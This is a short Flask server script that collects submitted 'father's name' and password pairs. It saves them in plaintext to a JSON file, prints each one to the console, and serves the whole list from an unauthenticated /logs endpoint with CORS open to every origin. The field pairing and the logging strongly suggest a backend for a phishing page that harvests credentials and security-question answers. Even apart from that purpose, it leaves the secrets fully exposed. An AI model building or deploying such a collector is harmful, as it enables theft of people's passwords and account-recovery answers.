from flask import Flask, request, jsonify
from flask_cors import CORS
from datetime import datetime
import json, os

app = Flask(__name__)
CORS(app)

LOG_FILE = "logs.json"

def load_logs():
    if os.path.exists(LOG_FILE):
        with open(LOG_FILE, "r") as f:
            return json.load(f)
    return []

def save_logs(logs):
    with open(LOG_FILE, "w") as f:
        json.dump(logs, f, indent=2)

@app.route("/save", methods=["POST"])
def save_entry():
    data = request.get_json()

    father_name = data.get("father_name", "").strip()
    password    = data.get("password", "").strip()

    if not father_name or not password:
        return jsonify({"status": "error", "message": "Missing father's name or password"}), 400

    entry = {
        "id":          len(load_logs()) + 1,
        "father_name": father_name,
        "password":    password,
        "timestamp":   datetime.now().isoformat()
    }

    logs = load_logs()
    logs.append(entry)
    save_logs(logs)

    print(f"[LOG] Saved → Father: {father_name} | Password: {password}")
    return jsonify({"status": "ok", "saved": entry}), 200

@app.route("/logs", methods=["GET"])
def get_logs():
    return jsonify(load_logs()), 200

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    print(f"🚀 Server running on port {port}")
    app.run(host="0.0.0.0", port=port)
